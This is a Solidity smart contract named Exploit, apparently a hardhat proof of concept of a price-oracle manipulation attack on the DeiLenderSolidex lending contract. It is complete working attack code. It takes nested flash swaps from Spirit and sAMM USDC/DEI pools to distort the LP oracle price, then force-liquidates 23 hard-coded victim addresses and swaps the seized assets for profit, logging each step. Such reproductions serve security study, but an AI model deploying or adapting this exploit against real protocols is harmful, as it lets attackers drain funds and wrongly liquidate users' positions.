pragma solidity 0.6.12;

import "./IPancakePair.sol";
import "./IBaseV1Pair.sol";
import "./ILpDepositor.sol";
import "./Oracle.sol";
import "./DeiLenderSolidex.sol";

import "hardhat/console.sol";

contract Exploit {
    DeiLenderSolidex public constant deiLenderSolidex =
        DeiLenderSolidex(0xeC1Fc57249CEa005fC16b2980470504806fcA20d);
    IPancakePair public constant spiritUsdcDei =
        IPancakePair(0x8eFD36aA4Afa9F4E157bec759F1744A7FeBaEA0e);
    Oracle public oracle;
    IBaseV1Pair public sAMMUsdcDei;
    ILpDepositor public lpDepositor;
    ERC20 public usdc;
    ERC20 public dei;
    ERC20 public constant lpProvider =
        ERC20(0xD82001B651F7fb67Db99C679133F384244e20E79);
    address me;

    uint256 spiritAmountOut1;
    uint256 sAMMAmountOut1;

    constructor() public {
        oracle = Oracle(address(deiLenderSolidex.oracle()));
        lpDepositor = ILpDepositor(address(deiLenderSolidex.lpDepositor()));
        sAMMUsdcDei = IBaseV1Pair(address(oracle.pair()));
        usdc = ERC20(address(oracle.usdc()));
        dei = ERC20(address(oracle.dei()));
        me = address(this);
    }

    // callback of the sAMM swap
    function hook(address sender, uint256 amount0, uint256 amount1,
                  bytes calldata data) external {
        console.log("[+]      my USDC balance: %s", usdc.balanceOf(me));
        console.log("[+]      my DEI balance: %s", dei.balanceOf(me));
        console.log("[+]      my LP deposit token balance: %s", lpProvider.balanceOf(me));
        console.log("[+]      my LP token balance: %s", sAMMUsdcDei.balanceOf(me));
        console.log("[+]      sAMM LP price: %s\n", oracle.getPrice());

        // vitims
        address[] memory victims = new address[](23);
        victims[0] = 0x6F45De9817878B302186F56B38c4c1F2533B660F;
        victims[1] = 0xe9af2E97D387F4C20B71492E774ACe535B36949a;
        victims[2] = 0x396BFf8a62a4C8B3cf4C385D45e77795D9ED6B42;
        victims[3] = 0xB1fe6937a51870ea66B863BE76d668Fc98694f25;
        victims[4] = 0x1615E54bC83b3Bf0c26829b9B1f5F8168FDF98D7;
        victims[5] = 0x35C0578375D034B10Dc73d8Bb4D26F8c1bfF0001;
        victims[6] = 0xC2E21fb6112C295ef69F23D6D595868CCF9a5c3c;
        victims[7] = 0x2e75332E7eb55056017dBCDeE206601Cab372eEC;
        victims[8] = 0xCbD6b0DeE49EeA88a3343Ff4E5a2423586B4C1D6;
        victims[9] = 0xb0FabE3bCAC50F065DBF68C0B271118DDC005402;
        victims[10] = 0xf99C8873B972b4192e789F55AB954188D0d9A133;
        victims[11] = 0x57074E71b6BfA7d1810C47cf4FbE6A89A4E4b765;
        victims[12] = 0x5A4DDb0856fEE6b33f11CC264F369E77b0F0339C;
        victims[13] = 0x2637652AC58aDDfb67b401a1beFb5f48b967574D;
        victims[14] = 0x951b928F2a8ba7CE14Cc418cfEBfeE30A57294c3;
        victims[15] = 0x549d2d44a12B121A8b3667463448605B1F2D52A5;
        victims[16] = 0xEB74C6E3c046E16190DfeFB7d3CBA84Db5790CC4;
        victims[17] = 0x468c2EDe01B07c19d90f6C9b67617d1d7e6e2200;
        victims[18] = 0xEC36f0475B588A7f5C01D17c49C855f1ea6a0AAF;
        victims[19] = 0x19246d4cB92671D0F2166D00C9de687Ead3206F8;
        victims[20] = 0xcff8097B146Dc56f40bDf34e18e0283dd404765F;
        victims[21] = 0x1D58E9c7B65b4F07afB58c72D49979D2F2c7A3F7;
        victims[22] = 0x4Fa6B043DC07ac6081F0fFD1D62E937f5E4D63cF;

        console.log("[+] (3) liquidate the assets of victims");

        dei.approve(deiLenderSolidex.mintHelper(), dei.balanceOf(me));
        deiLenderSolidex.liquidate(victims, me);

        console.log("[+]      my USDC balance: %s", usdc.balanceOf(me));
        console.log("[+]      my DEI balance: %s", dei.balanceOf(me));
        console.log("[+]      my LP deposit token balance: %s", lpProvider.balanceOf(me));
        console.log("[+]      my LP token balance: %s\n", sAMMUsdcDei.balanceOf(me));


        // return the second borrowed DEI
        dei.transfer(address(sAMMUsdcDei), sAMMAmountOut1);
    }

    // callback of the spirit swap
    function pancakeCall(address sender, uint amount0, uint amount1,
                         bytes calldata data) external {
        console.log("[+]      my USDC balance: %s", usdc.balanceOf(me));
        console.log("[+]      my DEI balance: %s", dei.balanceOf(me));

        // perform the second flash swap
        sAMMUsdcDei.sync(); // reduce the cost of flash swap
        uint256 _reserve0 = sAMMUsdcDei.reserve0();
        uint256 _reserve1 = sAMMUsdcDei.reserve1();
        console.log("[+]      sAMM USDC reserve: %s", _reserve0);
        console.log("[+]      sAMM DEI reserve: %s", _reserve1);

        // flash swap out _reserve1 - 1 DEI
        // 
        // calculate the amount of DEI required to pay back at the end of flash
        // swap, namely sAMMAmountOut1, by counting the fee (1%%) in
        //
        sAMMAmountOut1 =  (_reserve1 - 1) * 10000 / 9999 + 1; // i.e., count fee in
        console.log("[+]      the amount of DEI to borrow (sAMM): %s", _reserve1 - 1);
        console.log("[+]      the amount of DEI to pay back (sAMM): %s", sAMMAmountOut1);

        console.log("[+]      sAMM LP price: %s\n", oracle.getPrice());

        console.log("[+] (2) flash swap from sAMM pool");
        sAMMUsdcDei.swap(0, _reserve1 - 1, me, abi.encode(uint8(0x2)));

        console.log("[+] (4) exit the flash swap from sAMM pool");
        console.log("[+]      my USDC balance: %s", usdc.balanceOf(me));
        console.log("[+]      my DEI balance: %s", dei.balanceOf(me));
        console.log("[+]      my LP deposit token balance: %s", lpProvider.balanceOf(me));
        console.log("[+]      my LP token balance: %s\n", sAMMUsdcDei.balanceOf(me));

        // deposit LP tokens to sAMMU pool to earn sAMMU pool tokens
        console.log("[+] (5) deposit LP deposit tokens to earn LP tokens");
        lpDepositor.withdraw(address(sAMMUsdcDei), lpProvider.balanceOf(me));

        console.log("[+]      my LP deposit token balance: %s", lpProvider.balanceOf(me));
        console.log("[+]      my LP token balance: %s\n", sAMMUsdcDei.balanceOf(me));

        // prepare the LP burning
        console.log("[+] (6) remove liquidity");
        ERC20(address(sAMMUsdcDei))
            .transfer(address(sAMMUsdcDei), sAMMUsdcDei.balanceOf(me));

        // burn the LP
        sAMMUsdcDei.burn(me);

        console.log("[+]      my USDC balance: %s", usdc.balanceOf(me));
        console.log("[+]      my DEI balance: %s", dei.balanceOf(me));
        console.log("[+]      my LP token balance: %s\n", sAMMUsdcDei.balanceOf(me));

        // swap all earned USDC to DEi
        console.log("[+] (7) swap USDC to DEI from sAMM pool");
        uint256 deiAmountOut =
            sAMMUsdcDei.getAmountOut(usdc.balanceOf(me), address(usdc));
        usdc.transfer(address(sAMMUsdcDei), usdc.balanceOf(me));
        sAMMUsdcDei.swap(0, deiAmountOut, me, '');

        console.log("[+]      my USDC balance: %s", usdc.balanceOf(me));
        console.log("[+]      my DEI balance: %s\n", dei.balanceOf(me));

        // return the second borrowed DEI
        dei.transfer(address(spiritUsdcDei), spiritAmountOut1);
    }

    function run() public {
        console.log("[+] (0) before attack");
        console.log("[+]      my USDC balance: %s", usdc.balanceOf(me));
        console.log("[+]      my DEI balance: %s", dei.balanceOf(me));

        // force reserve to match balance (to reduce the cost of flash swap)
        spiritUsdcDei.sync();

        // token 0: USDC | token 1: DEI
        (uint256 _reserve0, uint256 _reserve1, ) = spiritUsdcDei.getReserves();
        console.log("[+]      spirit USDC reserve: %s", _reserve0);
        console.log("[+]      spirit DEI reserve: %s", _reserve1);

        // flash swap out _reserve1 - 1 DEI
        //
        // calculate the amount of DEI required to be paid back at the end of the flash swap, namely spiritAmountOut1, by counting the fee (0.3%) in 
        // 
        // details are available at https://github.com/pancakeswap/pancake-swap-core/blob/3b214306770e86bc3a64e67c2b5bdb566b4e94a7/contracts/PancakePair.sol#L182
        // 
        //    (_reserve0 * 1000) * ((1 + spiritAmountOut1) * 1000 - spiritAmountOut1 * 3) >= _reserve0 * _reserve1 * 1000 * 1000
        //
        spiritAmountOut1 = (_reserve1 - 1) * 1000 / 997 + 1; 
        console.log("[+]      the amount of DEI to borrow (spirit): %s", _reserve1 - 1);
        console.log("[+]      the amount of DEI to pay back (spirit): %s\n", spiritAmountOut1);

        // flash swap from spirit
        console.log("[+] (1) flash swap from spirit pool");
        spiritUsdcDei.swap(0, _reserve1 - 1, me, abi.encode(uint8(0x1)));

        console.log("[+] (8) exit the flash swap from spirit pool");
        console.log("[+]      my USDC balance: %s", usdc.balanceOf(me));
        console.log("[+]      my DEI balance: %s\n", dei.balanceOf(me));

        // get usdc
        console.log("[+] (9) swap DEI to USDC from sAMM pool");
        uint256 usdcAmountOut =
            sAMMUsdcDei.getAmountOut(dei.balanceOf(me), address(dei));
        dei.transfer(address(sAMMUsdcDei), dei.balanceOf(me));
        sAMMUsdcDei.swap(usdcAmountOut, 0, me, '');

        console.log("[+]      my USDC balance: %s", usdc.balanceOf(me));
        console.log("[+]      my DEI balance: %s", dei.balanceOf(me));
    }
}
